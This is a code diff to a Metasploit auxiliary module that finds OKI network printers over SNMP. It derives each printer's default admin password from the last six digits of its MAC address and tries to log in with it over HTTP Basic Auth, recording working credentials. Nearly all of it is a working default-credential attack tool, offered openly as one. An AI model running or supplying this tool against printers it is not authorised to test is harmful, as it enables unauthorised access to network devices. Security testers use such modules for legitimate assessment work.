@@ -10,15 +10,16 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::SNMPClient
-	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::Scanner
 
 	def initialize(info={})
 		super(update_info(info,
-			'Name'          => 'OKI Scanner',
+			'Name'          => 'OKI Printer Scanner',
 			'Description'   => %q{
 				Look for OKI printers on the network and try to connect to them as default
-				admin credentials
+				admin credentials. By default OKI network printers use the last six digits of
+				the MAC as admin password this addon will search for OKI printers on the network
+				and try to connect to them with the default password
 			},
 			'Author'        => 'antr6X <anthr6x[at]gmail.com>',
 			'License'       => MSF_LICENSE
@@ -41,21 +42,20 @@ class Metasploit3 < Msf::Auxiliary
 		@org_rport = datastore['RPORT']
 		datastore['RPORT'] = datastore['SNMPPORT']
 
-		indexPage = "index_ad.htm"
-		authReqPage = "status_toc_ad.htm"
+		index_page = "index_ad.htm"
+		auth_req_page = "status_toc_ad.htm"
 		snmp = connect_snmp()
 
 		snmp.walk("1.3.6.1.2.1.2.2.1.6") do |mac|
-			lastSix  = mac.value.unpack("H2H2H2H2H2H2").join[-6,6].upcase
-			firstSix = mac.value.unpack("H2H2H2H2H2H2").join[0,6].upcase
+			last_six  = mac.value.unpack("H2H2H2H2H2H2").join[-6,6].upcase
+			first_six = mac.value.unpack("H2H2H2H2H2H2").join[0,6].upcase
 
 			#check if it is a OKI
 			#OUI list can be found at http://standards.ieee.org/develop/regauth/oui/oui.txt
-			if firstSix ==  "002536" || firstSix == "008087" || firstSix == "002536"
-				print_status("")
-				sysName = snmp.get_value('1.3.6.1.2.1.1.5.0').to_s
-				print_status("Found #{sysName}")
-				print_status("Trying to access #{ip}/#{authReqPage} with username: admin and password: #{lastSix}")
+			if first_six ==  "002536" || first_six == "008087" || first_six == "002536"
+				sys_name = snmp.get_value('1.3.6.1.2.1.1.5.0').to_s
+				print_status("Found: #{sys_name}")
+				print_status("Trying credential: admin/#{last_six}")
 
 				tcp = Rex::Socket::Tcp.create(
 					'PeerHost' => rhost,
@@ -67,24 +67,35 @@ class Metasploit3 < Msf::Auxiliary
 						}
 				)
 
-				auth = Rex::Text.encode_base64("admin:#{lastSix}")
-				tcp.put("GET /#{authReqPage} HTTP/1.1\r\nReferer: http://#{ip}/#{indexPage}\r\nAuthorization: Basic #{auth}\r\n\r\n")
+				auth = Rex::Text.encode_base64("admin:#{last_six}")
+
+				http_data = "GET /#{auth_req_page} HTTP/1.1\r\n"
+				http_data << "Referer: http://#{ip}/#{index_page}\r\n"
+				http_data << "Authorization: Basic #{auth}\r\n\r\n"
+
+				tcp.put(http_data)
 				data = tcp.recv(12)
 
 				responce = "#{data[9..11]}"
 
 				case responce
 				when "200"
-					message = "**Default credentials works** :)"
+					print_good("#{rhost}:#{datastore['HTTPPORT']} logged in as: admin/#{last_six}")
+					report_auth_info(
+						:host  => rhost,
+						:port  => datastore['HTTPPORT'],
+						:proto => "tcp",
+						:user  => 'admin',
+						:pass  => last_six
+					)
 				when "401"
-					message = "Default credentials failed :("
+					print_error("Default credentials failed")
 				when "404"
-					message = "Page not found, try credentials manually. user: admin pass: #{lastSix}"
+					print_status("Page not found, try credential manually: admin/{last_six}")
 				else
-					message = "Unexpected message"
+					print_status("Unexpected message")
 				end
 
-				print_status("#{message}\n")
 				disconnect()
 			end
 		end
@@ -99,9 +110,3 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("Unknown error: #{e.class} #{e}")
 		end
 end
-
-=begin
-by default OKI network printers use the last six digits of the MAC as admin password
-this addon will search for OKI printers on the network and try to connect to them with
-the default password
-=end
